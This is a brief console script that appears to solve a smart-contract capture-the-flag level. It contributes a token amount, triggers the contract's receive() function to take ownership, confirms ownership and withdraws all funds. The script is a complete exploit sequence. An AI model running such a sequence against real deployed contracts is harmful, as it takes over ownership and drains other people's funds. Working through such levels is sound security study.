/* 
Tools needed for this level:
- Console
*/

// 1.- Contribute to the contract for satisfying the requirement on the receive() function
await contract.contribute({from: player, value: '1'});

// 2.- Execute the receive() function satisfying its requirements
contract.sendTransaction({value: '1'});

// 3.- Check contract balance
(await web3.eth.getBalance(instance)).toString();

// 4.- Check if you are owner of the contract
await contract.owner();

// 5.- Withdraw all funds from contract
await contract.withdraw();
